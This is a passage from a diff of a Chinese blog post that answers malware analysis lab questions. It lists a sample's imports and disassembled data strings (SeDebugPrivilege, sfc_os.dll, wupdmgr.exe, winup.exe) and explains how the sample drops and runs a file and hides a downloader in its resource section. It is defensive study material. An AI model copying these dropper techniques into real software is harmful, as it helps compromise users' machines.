GetWindowsDirectoryA	KERNEL32<br>00402038		MoveFileA	KERNEL32<br>0040203C		GetTempPathA	KERNEL32<br>00402040		GetCurrentProcess	KERNEL32<br>00402044		OpenProcess	KERNEL32<br>00402048		CloseHandle	KERNEL32<br>0040204C		LoadResource	KERNEL32<br>00402054		_snprintf	MSVCRT<br>00402058		_exit	MSVCRT<br>0040205C		_XcptFilter	MSVCRT<br>00402060		exit	MSVCRT<br>00402064		__p___initenv	MSVCRT<br>00402068		__getmainargs	MSVCRT<br>0040206C		_initterm	MSVCRT<br>00402070		__setusermatherr	MSVCRT<br>00402074		_adjust_fdiv	MSVCRT<br>00402078		__p__commode	MSVCRT<br>0040207C		__p__fmode	MSVCRT<br>00402080		__set_app_type	MSVCRT<br>00402084		_except_handler3	MSVCRT<br>00402088		_controlfp	MSVCRT<br>0040208C		_stricmp	MSVCRT<br></code></pre></td></tr></table></figure>
+
+<p>根据以上的部分函数，猜测此程序可以创建文件，进行进程的操作还可以进行权限<code>Privilege</code>的修改</p>
+<p><strong>5.有哪些基于主机或者网络的特征可以被用来确定被这个恶意代码所感染的机器？</strong></p>
+<p>代码data节含有如下重要信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:0040302C aSedebugprivile db &#x27;SeDebugPrivilege&#x27;,0 ; DATA XREF: sub_401174+1B↑o<br>.data:0040303D                 align 10h<br>.data:00403040 ; CHAR LibFileName[]<br>.data:00403040 LibFileName     db &#x27;sfc_os.dll&#x27;,0       ; DATA XREF: sub_401174+2F↑o<br>.data:0040304B                 align 4<br>.data:0040304C aSystem32Wupdmg db &#x27;\system32\wupdmgr.exe&#x27;,0<br>.data:0040304C                                         ; DATA XREF: sub_4011FC+7D↑o<br>.data:00403062                 align 4<br>.data:00403064 ; char Format[]<br>.data:00403064 Format          db &#x27;%s%s&#x27;,0             ; DATA XREF: sub_4011FC+89↑o<br>.data:00403069                 align 4<br>.data:0040306C ; CHAR Type[]<br>.data:0040306C Type            db &#x27;BIN&#x27;,0              ; DATA XREF: sub_4011FC+AE↑o<br>.data:00403070 ; CHAR Name[]<br>.data:00403070 Name            db &#x27;#101&#x27;,0             ; DATA XREF: sub_4011FC+B3↑o<br>.data:00403075                 align 4<br>.data:00403078 ; CHAR ProcName[]<br>.data:00403078 ProcName        db &#x27;EnumProcessModules&#x27;,0<br>.data:00403078                                         ; DATA XREF: _main+5A↑o<br>.data:0040308B                 align 4<br>.data:0040308C ; CHAR aPsapiDll[]<br>.data:0040308C aPsapiDll       db &#x27;psapi.dll&#x27;,0        ; DATA XREF: _main+5F↑o<br>.data:00403096                 align 4<br>.data:00403098 ; CHAR aGetmodulebasen[]<br>.data:00403098 aGetmodulebasen db &#x27;GetModuleBaseNameA&#x27;,0<br>.data:00403098                                         ; DATA XREF: _main+76↑o<br>.data:004030AB                 align 4<br>.data:004030AC ; CHAR aPsapiDll_0[]<br>.data:004030AC aPsapiDll_0     db &#x27;psapi.dll&#x27;,0        ; DATA XREF: _main+7B↑o<br>.data:004030B6                 align 4<br>.data:004030B8 ; CHAR aEnumprocesses[]<br>.data:004030B8 aEnumprocesses  db &#x27;EnumProcesses&#x27;,0    ; DATA XREF: _main+92↑o<br>.data:004030C6                 align 4<br>.data:004030C8 ; CHAR aPsapiDll_1[]<br>.data:004030C8 aPsapiDll_1     db &#x27;psapi.dll&#x27;,0        ; DATA XREF: _main+97↑o<br>.data:004030D2                 align 4<br>.data:004030D4 aSystem32Wupdmg_0 db &#x27;\system32\wupdmgr.exe&#x27;,0<br>.data:004030D4                                         ; DATA XREF: _main+1C8↑o<br>.data:004030EA                 align 4<br>.data:004030EC ; char aSS_0[]<br>.data:004030EC aSS_0           db &#x27;%s%s&#x27;,0             ; DATA XREF: _main+1D4↑o<br>.data:004030F1                 align 4<br>.data:004030F4 aWinupExe       db &#x27;\winup.exe&#x27;,0       ; DATA XREF: _main+200↑o<br>.data:004030FF                 align 10h<br>.data:00403100 ; char aSS_1[]<br>.data:00403100 aSS_1           db &#x27;%s%s&#x27;,0             ; DATA XREF: _main+20C↑o<br>.data:00403105                 align 10h<br>.data:00403110 dword_403110    dd 1                    ; DATA XREF: start+6E↑r<br>.data:00403114                 align 10h<br></code></pre></td></tr></table></figure>
+
+<p>根据以上信息和汇编代码猜测病毒会在<code>\system32</code>目录下创建<code>wupdmgr.exe</code>文件，并尝试执行此程序，如果执行成功，则函数<code>sub_401174</code>返回<code>0</code></p>
+<p>还有一个隐藏在资源节的PE文件，用二进制模式打开后可以看到如下文本</p>
+<p><img src="https://i.loli.net/2019/01/19/5c43386273988.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>6.这个文件在资源段包含一个资源。使用Resource Hacker工具来检查资源，然后抽取资源。从资源中你能发现什么吗？</strong></p>
+<p>使用<code>Resource Hacker</code>可以发现该程序的资源节存在一个可执行程序，程序指向一个网址并从该网址下载文件，但下载的文件内容未知。</p>
+<hr>
+<h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/">静态分析</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/01/%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">在虚拟机中分析恶意代码</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/01/%E5%89%8D%E8%A8%80/">
+                        <span class="hidden-mobile">前言</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
